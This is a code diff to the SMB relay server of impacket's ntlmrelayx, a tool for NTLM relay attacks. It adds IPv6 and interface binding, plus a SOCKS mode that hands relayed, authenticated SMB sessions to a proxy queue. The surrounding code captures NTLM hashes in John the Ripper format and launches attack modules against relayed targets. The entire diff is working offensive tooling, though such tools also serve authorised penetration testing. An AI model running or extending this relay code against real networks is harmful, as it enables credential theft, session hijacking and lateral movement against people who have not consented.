@@ -19,6 +19,7 @@ from threading import Thread
 import ConfigParser
 import struct
 import logging
+import socket
 
 from impacket import smb, ntlm
 from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
@@ -26,6 +27,7 @@ from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
 from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient, IMAPRelayClient
 from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
 from impacket.spnego import ASN1_AID
+from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.utils.targetsutils import ProxyIpTranslator
 
 
@@ -63,14 +65,22 @@ class SMBRelayServer(Thread):
         smbConfig.set('IPC$','share type','3')
         smbConfig.set('IPC$','path','')
 
-        self.server = SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
+        # Change address_family to IPv6 if this is configured
+        if self.config.ipv6:
+            SMBSERVER.address_family = socket.AF_INET6
+
+        # changed to dereference configuration interfaceIp
+        self.server = SMBSERVER((config.interfaceIp,445), config_parser = smbConfig)
+
         self.server.processConfigFile()
 
         self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
         self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, self.SmbSessionSetupAndX)
         # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
         #TODO: See if this is the best way to accomplish this
-        self.server.addConnection('SMBRelay', '0.0.0.0', 445)
+
+        # changed to dereference configuration interfaceIp
+        self.server.addConnection('SMBRelay', config.interfaceIp, 445)
 
     def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId, checkStatus = False)
@@ -251,7 +261,7 @@ class SMBRelayServer(Thread):
                     if self.server.getJTRdumpPath() != '':
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                     del (smbData[self.target])
-                    self.do_attack(client)
+                    self.do_attack(client, connData)
                     # Now continue with the server
                 #############################################################
 
@@ -317,9 +327,16 @@ class SMBRelayServer(Thread):
                 logging.info(ntlm_hash_data['hash_string'])
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
-                #TODO: Fix this for other protocols than SMB [!]
-                clientThread = self.config.attacks['SMB'](self.config,smbClient,self.config.exeFile,self.config.command)
-                clientThread.start()
+
+                if self.config.runSocks is True and self.target[0] == 'SMB':
+                    # For now, we only support SOCKS for SMB, for now.
+                    # Pass all the data to the socksplugins proxy
+                    activeConnections.put((self.target[1], 445, sessionSetupData['Account'], smbClient, connData))
+                    logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target[1])
+                else:
+                    #TODO: Fix this for other protocols than SMB [!]
+                    clientThread = self.config.attacks['SMB'](self.config,smbClient,self.config.exeFile,self.config.command)
+                    clientThread.start()
 
                 #Log this target as processed for this client
                 self.targetprocessor.log_target(connData['ClientIP'],self.target)
@@ -453,11 +470,17 @@ class SMBRelayServer(Thread):
 
         return clientResponse, errorCode
 
-    def do_attack(self,client):
+    def do_attack(self,client, connData=None):
         #Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
         if self.target[0] == 'SMB':
-            clientThread = self.config.attacks['SMB'](self.config, client, self.authUser)
-            clientThread.start()
+            if self.config.runSocks is True:
+                # For now, we only support SOCKS for SMB, for now.
+                # Pass all the data to the socksplugins proxy
+                activeConnections.put((self.target[1], 445, self.authUser, client, connData))
+                logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target[1])
+            else:
+                clientThread = self.config.attacks['SMB'](self.config, client, self.authUser)
+                clientThread.start()
         if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
             clientThread = self.config.attacks['LDAP'](self.config, client, self.authUser)
             clientThread.start()
@@ -472,6 +495,7 @@ class SMBRelayServer(Thread):
             clientThread.start()
 
     def _start(self):
+        self.server.daemon_threads=True
         self.server.serve_forever()
 
     def run(self):
